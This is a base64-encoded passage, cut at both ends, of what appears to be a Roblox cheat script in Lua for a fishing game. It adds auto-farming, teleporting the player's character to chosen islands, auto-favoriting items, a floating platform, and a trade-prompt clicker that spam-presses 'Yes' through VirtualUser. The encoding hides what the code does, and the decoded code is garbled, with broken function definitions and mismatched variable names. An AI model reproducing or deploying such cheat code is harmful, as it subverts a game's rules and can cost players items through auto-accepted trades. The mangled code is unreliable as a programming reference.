W5kICNBbGR5VG9pYyA+IDAgdGhlbgogICAgICAgIGxvY2FsIHZhcl9ucjFvbzYgPSBBbGR5VG9pY1ttYXRoLnJhbmRvbSgxLCAjQWxkeVRvaWMpXQogICAgICAgIGxvY2FsIHZhcl8xcDFxaG4gPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaWYgQWxkeVRvaVQuQW5jaG9yZWQgdGhlbgogICAgICAgICAgICBBbGR5VG9pVC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICAgICAgQWxkeVRvaVQuQ0ZyYW1lID0gQWxkeVRvaVEKICAgICAgICBpZiBBbGR5VG9pR0cuZW5hYmxlZCB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lHRy5wb3NpdGlvbiA9IEFsZHlUb2lULkNGcmFtZQogICAgICAgIGVuZAogICAgZW5kCmVuZApBbGR5VG9pSzpQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAiQXV0byBGYXJtIFNldHRpbmdzIiwKICAgIERlc2MgPSAiQXV0byBmYXJtIHNlbGVjdGVkIGZpc2hpbmcgc3BvdHMuIiwKICAgIENvbG9yID0gIkdyZWVuIiwKICAgIExvY2tlZCA9IHRydWUKfSkKbG9jYWwgdmFyX3lpbGVocyA9IHt9CmZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gcGFpcnMoQWxkeVRvaWtHKSBkbwogICAgdGFibGUuaW5zZXJ0KEFsZHlUb2lCRywgQWxkeVRvaVEpCiAgICB0YWJsZS5zb3J0KEFsZHlUb2lCRykKZW5kCmxvY2FsIHZhcl9odXo2ZWYgPSBBbGR5VG9pSzpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgSXNsYW5kIiwKICAgIFZhbHVlcyA9IEFsZHlUb2lCRywKICAgIE11bHRpID0gdHJ1ZSwKICAgIEFsbG93Tm9uZSA9IHRydWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKEFsZHlUb2lRKQogICAgICAgIEFsZHlUb2lJVSA9IEFsZHlUb2lRCiAgICBlbmQKfSkKbG9jYWwgdmFyX3BzcDhwNCA9IDEwCmxvY2FsIHZhcl9kNWQxeG8gPSBBbGR5VG9pSzpJbnB1dCh7CiAgICBUaXRsZSA9ICJBdXRvIFRlbGVwb3J0IFRocmVzaG9sZCIsCiAgICBQbGFjZWhvbGRlciA9ICJEZWZhdWx0OiAxMCIsCiAgICBWYWx1ZSA9IDEwLAogICAgVHlwZSA9ICJJbnB1dCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKEFsZHlUb2lUKQogICAgICAgIGxvY2FsIHZhcl9sbTlqbnYgPSB0b251bWJlcihBbGR5VG9pVCkKICAgICAgICBpZiBBbGR5VG9pYyB0aGVuCiAgICAgICAgICAgIEFsZHlUb2l2RyA9IEFsZHlUb2ljCiAgICAgICAgICAgIEFsZHlUb2lROk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJUaHJlc2hvbGQgVXBkYXRlZCIsCiAgICAgICAgICAgICAgICBEZXNjcmlwdGlvbiA9ICJBdXRvIHRlbGVwb3J0IHdpbGwgb2NjdXIgd2hlbiB0aGUgZmlzaCBjb3VudCByZWFjaGVzICIgLi4gKEFsZHlUb2ljIC4uICIgaXRlbXMuIiksCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDEKICAgICAgICAgICAgfSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIEFsZHlUb2lROk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJJbnZhbGlkIElucHV0IiwKICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uID0gIkludmFsaWQgbnVtYmVyLiBQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMQogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZW5kCn0pCgpBbGR5VG9pYi5hdXRvRmFybWluZyA9IGZhbHNlCmxvY2FsIHZhcl80bjVkcTIgPSBBbGR5VG9pSzpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBGYXJtaW5nIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgQWxkeVRvaWIuYXV0b0Zhcm1pbmcgPSBBbGR5VG9pUQogICAgICAgIGlmIEFsZHlUb2lRIHRoZW4KICAgICAgICAgICAgQWxkeVRvaVVHKCkKICAgICAgICAgICAgQWxkeVRvaUpHOlNldChBbGR5VG9pUSkKICAgICAgICAgICAgQWxkeVRvaWVVKEFsZHlUb2lRKQogICAgICAgIGVuZAogICAgZW5kCn0pCmxvY2FsIHZhcl9sYW9oMmwgPSB0cnVlCmxvY2FsIHZhcl91b3RoNGcgPSBBbGR5VG9pQzpUb2dnbGUoewogICAgVGl0bGUgPSAiRmF2b3JpdGUgQWxsIEFydGlmYWN0IiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBmYXZvcml0ZSBhbGwgQXJ0aWZhY3QgaXRlbXMuIiwKICAgIERlZmF1bHQgPSB0cnVlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICBBbGR5VG9pU0cgPSBBbGR5VG9pUQogICAgZW5kCn0pCmxvY2FsIHZhcl9ob3hyd28gPSBBbGR5VG9pQzpUb2dnbGUoewogICAgVGl0bGUgPSAiRmF2b3JpdGUgQWxsIExlZ2VuZGFyeSIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZmF2b3JpdGUgYWxsIExlZ2VuZGFyeSBpdGVtcy4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICBBbGR5VG9pWi5MZWdlbmRhcnkgPSBBbGR5VG9pUQogICAgICAgIGlmIEFsZHlUb2lRIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBBbGR5VG9pTlUoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKbG9jYWwgdmFyX2JnOXZ0dCA9IEFsZHlUb2lDOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJGYXZvcml0ZSBBbGwgTXl0aGljYWwiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGZhdm9yaXRlIGFsbCBNeXRoaWNhbCBpdGVtcy4iLAogICAgRGVmYXVsdCA9IHRydWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKEFsZHlUb2lRKQogICAgICAgIEFsZHlUb2laLk15dGhpY2FsID0gQWxkeVRvaVEKICAgICAgICBpZiBBbGR5VG9pUSB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQWxkeVRvaWtVKCkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCmxvY2FsIHZhcl82amZka3IgPSBBbGR5VG9pQzpUb2dnbGUoewogICAgVGl0bGUgPSAiRmF2b3JpdGUgQWxsIFNlY3JldCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZmF2b3JpdGUgYWxsIFNlY3JldCBpdGVtcy4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICBBbGR5VG9pWi5TZWNyZXQgPSBBbGR5VG9pUQogICAgICAgIGlmIEFsZHlUb2lRIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBBbGR5VG9pVVUoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKbG9jYWwgdmFyX21mNmcxZyA9IEFsZHlUb2lIOldhaXRGb3JDaGlsZCgiVGFncyIpCmxvY2FsIHZhcl9zaDZjYmEgPSB7fQpmb3IgQWxkeVRvaVEsIEFsZHlUb2lUIGluIGlwYWlycyhBbGR5VG9pakc6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIHRhYmxlLmluc2VydChBbGR5VG9pTUcsIEFsZHlUb2lULk5hbWUpCmVuZApsb2NhbCB2YXJfemozZ3BrID0ge30KbG9jYWwgdmFyX2F1dzBhbiA9IEFsZHlUb2lDOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCB2YXJpYW50IiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBmYXZvcml0ZSB2YXJpYW50cy4iLAogICAgVmFsdWVzID0gQWxkeVRvaU1HLAogICAgTXVsdGkgPSB0cnVlLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgVmFsdWUgPSB7fSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgQWxkeVRvaUtHID0gQWxkeVRvaVEKICAgIGVuZAp9KQpBbGR5VG9pQzpCdXR0b24oewogICAgVGl0bGUgPSAiRmF2b3JpdGUgQWxsIiwKICAgIERlc2MgPSAiIEZhdm9yaXRlIGFsbCBpdGVtcy4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIEFsZHlUb2laVSgpCiAgICAgICAgZW5kKQogICAgZW5kCn0pCkFsZHlUb2lDOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJVbmZhdm9yaXRlIEFsbCIsCiAgICBEZXNjID0gIlVuZmF2b3JpdGUgYWxsIGZhdm9yaXRlZCBpdGVtcy4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgQWxkeVRvaWJVKCkKICAgIGVuZAp9KQpsb2NhbCB2YXJfNTd6dGk1CmxvY2FsIHZhcl9ya3ZzbHYKCmRvCiAgICBBbGR5VG9pUEcgPSBBbGR5VG9pUDpUb2dnbGUoewogICAgICAgIFRpdGxlID0gIkZsb2F0aW5nIFBsYXRmb3JtIiwKICAgICAgICBEZXNjID0gIlNwYXducyBhIGZsb2F0aW5nIHBsYXRmb3JtIHVuZGVyIHlvdXIgY2hhcmFjdGVyLiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgICAgIEFsZHlUb2liLmZsb2F0aW5nUGxhdGZvcm0gPSBBbGR5VG9pUQogICAgICAgICAgICBBbGR5VG9pVkcoQWxkeVRvaVEpCiAgICAgICAgZW5kCiAgICB9KQoKICAgIGxvY2FsIHZhcl9jaWY2ZXggPSB7CiAgICAgICAgRnJhbWVOYW1lID0gIlRyYWRlUHJvbXB0IiwKICAgICAgICBZZXNCdXR0b25OYW1lID0gIlllcyIsCiAgICAgICAgQ2xpY2tzUGVyU2Vjb25kID0gMSwKICAgICAgICBNYXhTcGFtU2Vjb25kcyA9IDQsCiAgICAgICAgRWRnZVBhZGRpbmdGcmFjID0gMC4wNSwKICAgICAgICBVc2VWSU0gPSB0cnVlLAogICAgICAgIEFsc29Nb3ZlTW91c2UgPSBmYWxzZSwKICAgICAgICBDbGlja0RlbGF5ID0gMC4zLAogICAgICAgIE1heFNwYW1UaW1lID0gMC41LAogICAgICAgIFN0b3BPblRleHRNYXRjaGVzID0geyJ0cmFkZSBjb21wbGV0ZWQhIiwgInRyYWRlIHN1Y2Nlc3NmdWwifSwKICAgICAgICBTdG9wT25GYWlsTWF0Y2hlcyA9IHsidHJhZGUgZGVjbGluZWQiLCAidHJhZGUgZmFpbGVkIn0sCiAgICAgICAgUmF5ZmllbGRFbmFibGVkID0gdHJ1ZQogICAgfQoKICAgIGxvY2FsIHZhcl9jZmEycmkgPSBnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxVc2VyIikKICAgIGxvY2FsIHZhcl9lZHBhb2YgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQogICAgbG9jYWwgdmFyXzR1OGJscSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgbG9jYWwgdmFyX2VtczhpbCA9IEFsZHlUb2lHOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikKICAgIGxvY2FsIHZhcl9hMWIyNHQsIEFsZHlUb2lIID0gZmFsc2UsIGZhbHNlCiAgICBsb2NhbCB2YXJfbnd5NDdlID0gZmFsc2UKICAgIGxvY2FsIHZhcl84aXllM3ogPSBuaWwKICAgIGxvY2FsIHZhcl9nMWRsc3YgPSBuaWwKICAgIGxvY2FsIHZhcl9lc3dncWUgPSBuaWwKICAgIGxvY2FsIHZhcl9mODMwZ2IgPSBuaWwKICAgIGxvY2FsIHZhcl84NTNhNGogPSBuaWwKICAgIGxvY2FsIHZhcl9jNjNhajYgPSBuaWwKICAgIGxvY2FsIHZhcl84NzNqZGcgQWxkeVRvaUooQWxkeVRvaVEpCiAgICAgICAgcmV0dXJuIEFsZHlUb2lRIGFuZCAoQWxkeVRvaVEuUGFyZW50IGFuZCAoQWxkeVRvaVEuVmlzaWJsZSBhbmQgKEFsZHlUb2lRLkFjdGl2ZSBhbmQgKEFsZHlUb2lRLkFic29sdXRlU2l6ZS5NYWduaXR1ZGUgPiAwIGFuZCBBbGR5VG9pUTpJc0Rlc2NlbmRhbnRPZihBbGR5VG9pTykpKSkpCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfYTB2eDR2IEFsZHlUb2l3KCkKICAgICAgICBsb2NhbCB2YXJfdmdjbzBvID0gQWxkeVRvaU86RmluZEZpcnN0Q2hpbGQoQWxkeVRvaVEuRnJhbWVOYW1lKQogICAgICAgIHJldHVybiBBbGR5VG9pVCBhbmQgKEFsZHlUb2lUOklzQSgiU2NyZWVuR3VpIikgYW5kIEFsZHlUb2lUKSBvciBuaWwKICAgIGVuZAoKICAgIGxvY2FsIHZhcl9xcDhtZTUgQWxkeVRvaWwoKQogICAgICAgIGxvY2FsIHZhcl8waHh4OW8gPSBBbGR5VG9pdygpCiAgICAgICAgaWYgbm90IEFsZHlUb2lRIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICBsb2NhbCB2YXJfeXoyb2d3ID0gQWxkeVRvaVE6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiVGV4dExhYmVsIiwgdHJ1ZSkKICAgICAgICByZXR1cm4gQWxkeVRvaVQgYW5kIEFsZHlUb2lULlRleHQgb3IgbmlsCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfYnNvaHV3IEFsZHlUb2l1KCkKICAgICAgICBsb2NhbCB2YXJfazZ1MWs2ID0gQWxkeVRvaWwoKQogICAgICAgIGlmIG5vdCBBbGR5VG9pUSB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICBBbGR5VG9pUSA9IEFsZHlUb2lROmxvd2VyKCkKICAgICAgICByZXR1cm4gQWxkeVRvaVE6ZmluZCgiYWNjZXB0IikgYW5kIEFsZHlUb2lROmZpbmQoInRyYWRlIikgb3IgZmFsc2UKICAgIGVuZAoKICAgIGxvY2FsIHZhcl95M2d1enkgQWxkeVRvaXEoQWxkeVRvaVQpCiAgICAgICAgaWYgbm90IEFsZHlUb2lUIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICBmb3IgQWxkeVRvaVQsIEFsZHlUb2ljIGluIGlwYWlycyhBbGR5VG9pVDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBBbGR5VG9pdSgpIGFuZCAoQWxkeVRvaWM6SXNBKCJUZXh0QnV0dG9uIikgYW5kIEFsZHlUb2ljLk5hbWUgPT0gQWxkeVRvaVEuWWVzQnV0dG9uTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgaWYgQWxkeVRvaUooQWxkeVRvaWMpIHRoZW4gcmV0dXJuIEFsZHlUb2ljIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gbmlsCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfdnpuenNjIEFsZHlUb2l0KEFsZHlUb2lRKQogICAgICAgIGxvY2FsIHZhcl9xNGx0ZzIsIEFsZHlUb2lZID0gQWxkeVRvaVEuQWJzb2x1dGVQb3NpdGlvbiwgQWxkeVRvaVEuQWJzb2x1dGVTaXplCiAgICAgICAgbG9jYWwgdmFyXzBibjAzZSA9IEFsZHlUb2ljOkdldEd1aUluc2V0KCkKICAgICAgICByZXR1cm4gewogICAgICAgICAgICBYID0gQWxkeVRvaVQuWCwKICAgICAgICAgICAgWSA9IEFsZHlUb2lULlkgKyBBbGR5VG9pRy5ZLAogICAgICAgICAgICBXID0gQWxkeVRvaVkuWCwKICAgICAgICAgICAgSCA9IEFsZHlUb2lZLlkKICAgICAgICB9CiAgICBlbmQKCiAgICBsb2NhbCB2YXJfM2J0aHN1IEFsZHlUb2lSKEFsZHlUb2lUKQogICAgICAgIGxvY2FsIHZhcl8zd3lkMWsgPSBtYXRoLmNsYW1wKEFsZHlUb2lRLkVkZ2VQYWRkaW5nRnJhYywgMCwgMC40OSkKICAgICAgICBsb2NhbCB2YXJfb2lzZmZ4LCBBbGR5VG9pRyA9IEFsZHlUb2lULlggKyBBbGR5VG9pVC5XICogQWxkeVRvaWMsIEFsZHlUb2lULlggKyBBbGR5VG9pVC5XICogKDEgLSBBbGR5VG9pYykKICAgICAgICBsb2NhbCB2YXJfcDQ1M3UyLCBBbGR5VG9pcyA9IEFsZHlUb2lULlkgKyBBbGR5VG9pVC5IICogQWxkeVRvaWMsIEFsZHlUb2lULlkgKyBBbGR5VG9pVC5IICogKDEgLSBBbGR5VG9pYykKICAgICAgICBsb2NhbCB2YXJfOGRzc3V1ID0gKEFsZHlUb2lZICsgQWxkeVRvaUcpIC8gMgogICAgICAgIGxvY2FsIHZhcl8zeTJqM2ogPSAoQWxkeVRvaU8gKyBBbGR5VG9pcykgLyAyCiAgICAgICAgcmV0dXJuIEFsZHlUb2lILCBBbGR5VG9pZwogICAgZW5kCgogICAgKEFsZHlUb2lHLlBsYXllckd1aTpXYWl0Rm9yQ2hpbGQoIlByb21wdCIpKS5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgaWYgQWxkeVRvaVEuTmFtZSA9PSAiTm90aWZpY2F0aW9uUHJvbXB0IiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl9sdWNnOWkgPSBBbGR5VG9pUTpXYWl0Rm9yQ2hpbGQoIk9wdGlvbnMiKQogICAgICAgICAgICBsb2NhbCB2YXJfODkyZzFwID0gQWxkeVRvaVQ6V2FpdEZvckNoaWxkKCJZZXMiKQogICAgICAgICAgICBBbGR5VG9pYy5BY3RpdmUgPSB0cnVlCiAgICAgICAgICAgIEFsZHlUb2ljLlZpc2libGUgPSB0cnVlCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgbG9jYWwgdmFyX2JzNmI2OSBBbGR5VG9pbihBbGR5VG9pYywgQWxkeVRvaVkpCiAgICAgICAgaWYgQWxkeVRvaVEuVXNlVklNIGFuZCBBbGR5VG9pVCB0aGVuCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lRLkFsc29Nb3ZlTW91c2UgdGhlbgogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lUOlNlbmRNb3VzZU1vdmVFdmVudChBbGR5VG9pYywgQWxkeVRvaVksIGdhbWUpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KEFsZHlUb2lRLkNsaWNrRGVsYXkpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIEFsZHlUb2lUOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KEFsZHlUb2ljLCBBbGR5VG9pWSwgMCwgdHJ1ZSwgZ2FtZSwgMCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdChBbGR5VG9pUS5DbGlja0RlbGF5KQogICAgICAgICAgICAgICAgQWxkeVRvaVQ6U2VuZE1vdXNlQnV0dG9uRXZlbnQoQWxkeVRvaWMsIEFsZHlUb2lZLCAwLCBmYWxzZSwgZ2FtZSwgMCkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVsc2VpZiBBbGR5VG9pViBhbmQgQWxkeVRvaUooQWxkeVRvaVYpIHRoZW4KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQWxkeVRvaVYuTW91c2VCdXR0b24xQ2xpY2s6RmlyZSgpCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIHZhcl8zeTlyYmUgQWxkeVRvaXIoKQogICAgICAgIEFsZHlUb2lnID0gdHJ1ZQogICAgICAgIGZvciBBbGR5VG9pUSA9IDEsIDUwLCAxIGRvCiAgICAgICAgICAgIGlmIG5vdCBBbGR5VG9pSCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICBlbmQKICAgICAgICBBbGR5VG9pSCA9IGZhbHNlCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfaHRmcDBwIEFsZHlUb2lGKEFsZHlUb2lRLCBBbGR5VG9pVCkKICAgICAgICBsb2NhbCB2YXJfNzB0eGtuID0gdGljaygpICsgKEFsZHlUb2lUIG9yIDIpCiAgICAgICAgd2hpbGUgdGljaygpIDwgQWxkeVRvaWMgZG8KICAgICAgICAgICAgbG9jYWwgdmFyXzY3MzcxaiA9IEFsZHlUb2lxKEFsZHlUb2lRKQogICAgICAgICAgICBpZiBBbGR5VG9pVCBhbmQgQWxkeVRvaUooQWxkeVRvaVQpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBBbGR5VG9pVAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIG5pbAogICAgZW5kCgogICAgbG9jYWwgdmFyXzd5ZmtlNSBBbGR5VG9pWCgpCiAgICAgICAgaWYgQWxkeVRvaUggdGhlbiByZXR1cm4gZW5kCiAgICAgICAgQWxkeVRvaVYgPSBBbGR5VG9pRihBbGR5VG9pZCwgMikKICAgICAgICBpZiBub3QgQWxkeVRvaVYgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgdmFyX3pqbmlibyA9IEFsZHlUb2l0KEFsZHlUb2lWKQogICAgICAgIEFsZHlUb2lIID0gdHJ1ZQogICAgICAgIEFsZHlUb2lnID0gZmFsc2UKICAgICAgICBBbGR5VG9pcCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCB2YXJfZDkzdG8zID0gdGljaygpCiAgICAgICAgICAgIGxvY2FsIHZhcl9qaHp1cWEgPSAwCiAgICAgICAgICAgIHdoaWxlIEFsZHlUb2lIIGFuZCAoQWxkeVRvaXMgYW5kIG5vdCBBbGR5VG9pZykgZG8KICAgICAgICAgICAgICAgIGlmIG5vdCBBbGR5VG9pSihBbGR5VG9pVikgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lZICUgNSA9PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfc2kyanQ5ID0gQWxkeVRvaXQoQWxkeVRvaVYpCiAgICAgICAgICAgICAgICAgICAgaWYgQWxkeVRvaVEgdGhlbiBBbGR5VG9pVCA9IEFsZHlUb2lRIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdWFqMzlzLCBBbGR5VG9pTyA9IEFsZHlUb2lSKEFsZHlUb2lUKQogICAgICAgICAgICAgICAgQWxkeVRvaW4oQWxkeVRvaUcsIEFsZHlUb2lPKQogICAgICAgICAgICAgICAgQWxkeVRvaVkgPSBBbGR5VG9pWSArIDEKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl92dHM1Z3MgPSAxIC8gbWF0aC5jbGFtcChBbGR5VG9pUS5DbGlja3NQZXJTZWNvbmQsIDYsIDQwKQogICAgICAgICAgICAgICAgdGFzay53YWl0KEFsZHlUb2lzKQogICAgICAgICAgICAgICAgaWYgdGljaygpIC0gQWxkeVRvaWMgPiBBbGR5VG9pUS5NYXhTcGFtU2Vjb25kcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgQWxkeVRvaUggPSBmYWxzZQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGxvY2FsIHZhcl81eXN6bXMgQWxkeVRvaUQoKQogICAgICAgIGlmIEFsZHlUb2lmIHRoZW4KICAgICAgICAgICAgQWxkeVRvaWY6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIEFsZHlUb2lmID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgQWxkeVRvaXogPSBBbGR5VG9peiBvciBBbGR5VG9pWTpGaW5kRmlyc3RDaGlsZCgiR2xvYmFsTm90aWZpY2F0aW9ucyIpCiAgICAgICAgaWYgQWxkeVRvaXogYW5kIEFsZHlUb2l6OklzQSgiUmVtb3RlRXZlbnQiKSB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lmID0gQWxkeVRvaXouT25DbGllbnRFdmVudDpDb25uZWN0KGZ1bmN0aW9uKEFsZHlUb2lUKQogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2U4YWNyciA9IHR5cGUoQWxkeVRvaVQpID09ICJ0YWJsZSIgYW5kIEFsZHlUb2lULlRleHQgb3IgQWxkeVRvaVQKICAgICAgICAgICAgICAgIGlmIG5vdCBBbGR5VG9pYyB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9vazRweXogPSAodG9zdHJpbmcoQWxkeVRvaWMpKTpsb3dlcigpCiAgICAgICAgICAgICAgICBmb3IgQWxkeVRvaVEsIEFsZHlUb2lUIGluIGlwYWlycyhBbGR5VG9pUS5TdG9wT25UZXh0TWF0Y2hlcykgZG8KICAgICAgICAgICAgICAgICAgICBpZiBzdHJpbmcuZmluZChBbGR5VG9pWSwgQWxkeVRvaVQ6bG93ZXIoKSwgMSwgdHJ1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBBbGR5VG9pcigpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBmb3IgQWxkeVRvaVEsIEFsZHlUb2lUIGluIGlwYWlycyhBbGR5VG9pUS5TdG9wT25GYWlsTWF0Y2hlcykgZG8KICAgICAgICAgICAgICAgICAgICBpZiBzdHJpbmcuZmluZChBbGR5VG9pWSwgQWxkeVRvaVQ6bG93ZXIoKSwgMSwgdHJ1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBBbGR5VG9pcigpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIHZhcl9rOXgzOHAgQWxkeVRvaUwoKQogICAgICAgIGlmIG5vdCBBbGR5VG9pcyBvciBub3QgQWxkeVRvaWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgaWYgQWxkeVRvaWQuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgIHRhc2suZGVsYXkoQWxkeVRvaVEuQ2xpY2tEZWxheSwgQWxkeVRvaVgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBBbGR5VG9pcigpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfbnRsOXhyIEFsZHlUb2lOKCkKICAgICAgICBpZiBBbGR5VG9peCB0aGVuIEFsZHlUb2l4OkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBBbGR5VG9pZCA9IEFsZHlUb2l3KCkKICAgICAgICBpZiBub3QgQWxkeVRvaWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgQWxkeVRvaXggPSAoQWxkeVRvaWQ6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJFbmFibGVkIikpOkNvbm5lY3QoQWxkeVRvaUwpCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfeGdudnUyIEFsZHlUb2lrKEFsZHlUb2lUKQogICAgICAgIEFsZHlUb2lUID0gQWxkeVRvaVQgb3Ige30KICAgICAgICBmb3IgQWxkeVRvaVQsIEFsZHlUb2ljIGluIHBhaXJzKEFsZHlUb2lUKSBkbwogICAgICAgICAgICBpZiBBbGR5VG9pUVtBbGR5VG9pVF0gfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgIEFsZHlUb2lRW0FsZHlUb2lUXSA9IEFsZHlUb2ljCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIEFsZHlUb2lEKCkKICAgIGVuZAoKICAgIGxvY2FsIHZhcl83ZGw3ZWEgQWxkeVRvaVUoKQogICAgICAgIGlmIEFsZHlUb2lzIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIEFsZHlUb2lzID0gdHJ1ZQogICA